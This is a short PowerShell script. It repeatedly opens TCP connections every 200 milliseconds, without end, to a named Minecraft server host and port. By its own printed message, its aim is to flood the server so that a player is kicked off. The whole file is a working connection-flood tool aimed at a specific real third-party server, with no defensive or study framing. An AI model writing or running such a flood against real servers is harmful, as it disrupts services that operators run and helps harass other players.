$server = "SquadMC.exaroton.me"
$port = 37863
$count = 0

Write-Host "Spamming connections to $server`:$port to kick player..."
Write-Host "Press Ctrl+C to stop"

while ($true) {
    $count++
    try {
        $tcp = New-Object System.Net.Sockets.TcpClient
        $tcp.ConnectAsync($server, $port).Wait(1000)
        if ($tcp.Connected) {
            $tcp.Close()
            Write-Host "[$count] Connection sent at $(Get-Date -Format 'HH:mm:ss')"
        }
    } catch {
        # ignore errors
    }
    Start-Sleep -Milliseconds 200
}
